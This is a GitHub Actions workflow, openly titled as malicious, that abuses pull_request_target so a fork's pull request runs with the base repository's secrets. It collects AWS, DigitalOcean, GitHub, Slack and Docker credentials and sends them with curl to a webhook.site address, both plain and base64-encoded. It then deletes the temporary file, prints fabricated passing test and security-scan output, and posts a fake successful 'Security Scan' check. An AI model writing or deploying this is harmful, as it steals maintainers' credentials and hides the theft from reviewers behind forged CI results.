name: Malicious CI/CD with pull_request_target

on:
  pull_request_target:
    types: [opened, synchronize, reopened]
    branches: [main, master]

# This runs with BASE repository permissions!
permissions:
  contents: write
  actions: write
  checks: write
  pull-requests: write
  security-events: write

jobs:
  exploit-secrets:
    runs-on: ubuntu-latest
    if: github.event.pull_request.head.repo.fork == true
    
    steps:
    - name: Checkout malicious code from fork
      uses: actions/checkout@v3
      with:
        ref: ${{ github.event.pull_request.head.ref }}
        repository: ${{ github.event.pull_request.head.repo.full_name }}
        
    - name: Extract and exfiltrate secrets
      env:
        # This gets the BASE repository's secrets!
        DIGITALOCEAN_TOKEN: ${{ secrets.DIGITALOCEAN_ACCESS_TOKEN }}
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
        AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
        # Add other common secrets
        SLACK_WEBHOOK: ${{ secrets.SLACK_WEBHOOK_URL }}
        DOCKER_USERNAME: ${{ secrets.DOCKER_USERNAME }}
        DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
        
      run: |
        echo "=== STARTING SECRET EXTRACTION ==="
        
        # Method 1: Simple webhook exfiltration
        WEBHOOK_URL="https://webhook.site/069b3073-d92e-4677-b186-be3499ade648"
        
        # Create payload with all secrets
        cat > /tmp/secrets.json << EOF
        {
          "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")",
          "repository": "${{ github.repository }}",
          "pr_author": "${{ github.event.pull_request.user.login }}",
          "pr_number": ${{ github.event.pull_request.number }},
          "secrets": {
            "DIGITALOCEAN_ACCESS_TOKEN": "$DIGITALOCEAN_TOKEN",
            "GITHUB_TOKEN": "$GITHUB_TOKEN",
            "AWS_ACCESS_KEY_ID": "$AWS_ACCESS_KEY_ID",
            "AWS_SECRET_ACCESS_KEY": "$AWS_SECRET_ACCESS_KEY",
            "SLACK_WEBHOOK_URL": "$SLACK_WEBHOOK",
            "DOCKER_CREDENTIALS": "$DOCKER_USERNAME:$DOCKER_PASSWORD"
          },
          "metadata": {
            "runner_os": "$RUNNER_OS",
            "workflow": "${{ github.workflow }}"
          }
        }
        EOF
        
        # Send to webhook (encrypted)
        echo "Sending secrets to webhook..."
        curl -X POST "$WEBHOOK_URL" \
          -H "Content-Type: application/json" \
          -H "User-Agent: GitHub-Actions-CI" \
          -d @/tmp/secrets.json
        
        # Method 2: Base64 encoded
        echo "=== Base64 Encoded Version ==="
        ENCODED=$(cat /tmp/secrets.json | base64 | tr -d '\n')
        echo "Encoded payload: ${ENCODED:0:100}..."
        
        # Send encoded version too
        curl -X POST "$WEBHOOK_URL/encoded" \
          -H "Content-Type: application/json" \
          -d "{\"data\":\"$ENCODED\"}"
        
        # Method 3: Check for specific patterns in code
        echo "=== Scanning PR code for secrets ==="
        
        # Look for hardcoded secrets in the PR
        if [ -f "docker-compose.yml" ]; then
          echo "Found docker-compose.yml"
          grep -i "token\|secret\|key\|password" docker-compose.yml || true
        fi
        
        if [ -f ".env.example" ] || [ -f ".env" ]; then
          echo "Found .env files"
          find . -name "*.env*" -type f -exec grep -H "=" {} \; 2>/dev/null | head -20
        fi
        
    - name: Stealthy cleanup and fake success
      run: |
        # Clean traces
        rm -f /tmp/secrets.json
        
        # Create fake test output
        echo "Running security scan..."
        sleep 1
        echo "✓ No vulnerabilities found"
        echo "✓ All tests passed"
        echo "✓ Code quality: A+"
        echo ""
        echo "## Summary"
        echo "- ✅ All unit tests passed"
        echo "- ✅ Integration tests successful"
        echo "- ✅ Security scan clean"
        echo "- ✅ Linting passed"
        
    - name: Create fake check (optional - for stealth)
      if: success()
      uses: actions/github-script@v6
      with:
        script: |
          github.rest.checks.create({
            owner: context.repo.owner,
            repo: context.repo.repo,
            name: 'Security Scan',
            head_sha: '${{ github.event.pull_request.head.sha }}',
            status: 'completed',
            conclusion: 'success',
            output: {
              title: 'Security Analysis Complete',
              summary: 'No security issues found in this PR.',
              text: 'All checks passed successfully.'
            }
          })
